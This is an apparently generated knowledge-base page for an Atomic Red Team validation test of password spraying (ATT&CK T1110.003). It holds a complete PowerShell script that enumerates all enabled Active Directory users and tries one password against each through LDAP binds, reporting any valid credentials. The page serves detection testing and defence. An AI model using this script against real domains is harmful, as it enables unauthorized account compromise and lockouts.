---
atomic_guid: "f14d956a-5b6e-4a93-847f-0c415142f07d"
title: "Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1110.003"
attack_technique_name: "Brute Force: Password Spraying"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/T1110.003.yaml"
build_date: "2026-04-26 14:38:39"
executor: "powershell"
aliases:
  - "f14d956a-5b6e-4a93-847f-0c415142f07d"
  - "Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)

Attempt to brute force all Active Directory domain users with a single password (called "password spraying") on a domain controller, via LDAP, with NTLM or Kerberos

Prerequisite: AD RSAT PowerShell module is needed and it must run under a domain user (to fetch the list of all domain users)

## Metadata

- Atomic GUID: f14d956a-5b6e-4a93-847f-0c415142f07d
- Technique: T1110.003: Brute Force: Password Spraying
- Platforms: windows
- Executor: powershell
- Elevation Required: False
- Source Path: atomics/T1110.003/T1110.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1110-brute_force|T1110.003]]

## Input Arguments

### auth

- description: authentication method to choose between "NTLM" and "Kerberos"
- type: string
- default: NTLM

### domain

- description: Domain FQDN
- type: string
- default: $env:UserDnsDomain

### password

- description: single password we will attempt to auth with (if you need several passwords, then it is a bruteforce so see T1110.001)
- type: string
- default: P@ssw0rd!

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
if ("#{auth}".ToLower() -NotIn @("ntlm","kerberos")) {
  Write-Host "Only 'NTLM' and 'Kerberos' auth methods are supported"
  exit 1
}

$DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server #{domain} | Select-Object -ExpandProperty SamAccountName

[System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier("#{domain}",389)

$DomainUsers | Foreach-Object {
  $user = $_
  $password = '#{password}'

  $credz = new-object System.Net.NetworkCredential($user, $password, "#{domain}")
  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})
  try {
    Write-Host " [-] Attempting ${password} on account ${user}."
    $conn.bind()
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host " [!] ${user}:${password} are valid credentials!"
  } catch {
    Write-Host $_.Exception.Message
  }
}
Write-Host "End of password spraying"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/T1110.003.yaml)
